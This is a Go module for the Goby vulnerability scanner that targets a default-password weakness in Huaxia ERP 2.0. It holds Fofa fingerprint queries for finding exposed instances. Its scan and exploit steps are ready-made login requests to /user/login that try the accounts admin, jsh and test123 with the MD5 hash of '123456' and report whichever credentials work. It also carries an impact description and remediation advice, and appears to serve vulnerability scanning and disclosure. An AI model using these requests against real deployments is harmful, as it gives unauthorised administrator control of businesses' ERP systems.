package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Huaxia ERP 2.0 Default password",
    "Description": "<p>Based on SpringBoot framework and SaaS model, Huaxia ERP is determined to provide open source and easy to use ERP software for small and medium-sized enterprises. Currently, it focuses on purchase, sale and storage + finance + production functions. The main modules are retail management, purchase management, sales management, warehouse management, financial management, report query, system management and so on. Support advance payment, income and expenditure, warehouse allocation, assembly and disassembly, order and other features. Have commodity inventory, inbound and outbound statistics and other reports. At the same time, the role and permission of the detailed overall control, accurate to every button and menu.</p><p>Default password vulnerability exists in China ERP.</p>",
    "Product": "Huaxia ERP",
    "Homepage": "https://gitee.com/jishenghua/JSH_ERP",
    "DisclosureDate": "2022-06-01",
    "Author": "geyubin@baimaohui.net",
    "FofaQuery": " body=\"华夏ERP_v2.0\" || body=\"JSH_ERP\"",
    "GobyQuery": " body=\"华夏ERP_v2.0\" || body=\"JSH_ERP\"",
    "Level": "0",
    "Impact": "<p>Attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [
        "https://fofa.info/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "POST",
                "uri": "/user/login",
                "follow_redirect": false,
                "header": {
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "X-Requested-With": "XMLHttpRequest",
                    "Content-Length": "56",
                    "Connection": "close",
                    "Cookie": "JSESSIONID=8D62DBC27DA0E317490E1E5BAD11D2A5"
                },
                "data_type": "text",
                "data": "loginame=admin&password=e10adc3949ba59abbe56e057f20f883e"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "user can login",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/user/login",
                "follow_redirect": false,
                "header": {
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "X-Requested-With": "XMLHttpRequest",
                    "Content-Length": "56",
                    "Connection": "close",
                    "Cookie": "JSESSIONID=8D62DBC27DA0E317490E1E5BAD11D2A5"
                },
                "data_type": "text",
                "data": "loginame=jsh&password=e10adc3949ba59abbe56e057f20f883e"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "user can login",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/user/login",
                "follow_redirect": false,
                "header": {
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "X-Requested-With": "XMLHttpRequest",
                    "Content-Length": "56",
                    "Connection": "close",
                    "Cookie": "JSESSIONID=8D62DBC27DA0E317490E1E5BAD11D2A5"
                },
                "data_type": "text",
                "data": "loginame=test123&password=e10adc3949ba59abbe56e057f20f883e"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "user can login",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "OR",
        {
            "Request": {
                "method": "POST",
                "uri": "/user/login",
                "follow_redirect": false,
                "header": {
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "X-Requested-With": "XMLHttpRequest",
                    "Content-Length": "56",
                    "Connection": "close",
                    "Cookie": "JSESSIONID=8D62DBC27DA0E317490E1E5BAD11D2A5"
                },
                "data_type": "text",
                "data": "loginame=admin&password=e10adc3949ba59abbe56e057f20f883e"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "user can login",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|text|admin:123456"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/user/login",
                "follow_redirect": true,
                "header": {
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "X-Requested-With": "XMLHttpRequest",
                    "Content-Length": "56",
                    "Connection": "close",
                    "Cookie": "JSESSIONID=8D62DBC27DA0E317490E1E5BAD11D2A5"
                },
                "data_type": "text",
                "data": "loginame=jsh&password=e10adc3949ba59abbe56e057f20f883e"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "user can login",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|text|jsh:123456"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/user/login",
                "follow_redirect": true,
                "header": {
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "X-Requested-With": "XMLHttpRequest",
                    "Content-Length": "56",
                    "Connection": "close",
                    "Cookie": "JSESSIONID=8D62DBC27DA0E317490E1E5BAD11D2A5"
                },
                "data_type": "text",
                "data": "loginame=test123&password=e10adc3949ba59abbe56e057f20f883e"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "user can login",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|text|test123:123456"
            ]
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "1",
    "Translation": {
        "CN": {
            "Name": "华夏ERP2.0默认⼝令漏洞",
            "Product": "华夏ERP",
            "Description": "<p>华夏ERP基于SpringBoot框架和SaaS模式，立志为中小企业提供开源好用的ERP软件，目前专注进销存+财务+生产功能。主要模块有零售管理、采购管理、销售管理、仓库管理、财务管理、报表查询、系统管理等。支持预付款、收入支出、仓库调拨、组装拆卸、订单等特色功能。拥有商品库存、出入库统计等报表。同时对角色和权限进行了细致全面控制，精确到每个按钮和菜单。</p><p>华夏ERP存在默认口令漏洞。</p>",
            "Recommendation": "<p>1、修改默认⼝令，密码最好包含⼤⼩写字⺟、数字和特殊字符等，且位数⼤于8位。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p><p>3、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p>",
            "Impact": "<p>攻击者可通过默认口令漏洞控制整个平台，使用管理员权限操作核心的功能。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "Huaxia ERP 2.0 Default password",
            "Product": "Huaxia ERP",
            "Description": "<p>Based on SpringBoot framework and SaaS model, Huaxia ERP is determined to provide open source and easy to use ERP software for small and medium-sized enterprises. Currently, it focuses on purchase, sale and storage + finance + production functions. The main modules are retail management, purchase management, sales management, warehouse management, financial management, report query, system management and so on. Support advance payment, income and expenditure, warehouse allocation, assembly and disassembly, order and other features. Have commodity inventory, inbound and outbound statistics and other reports. At the same time, the role and permission of the detailed overall control, accurate to every button and menu.</p><p>Default password vulnerability exists in China ERP.</p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>Attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9955"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}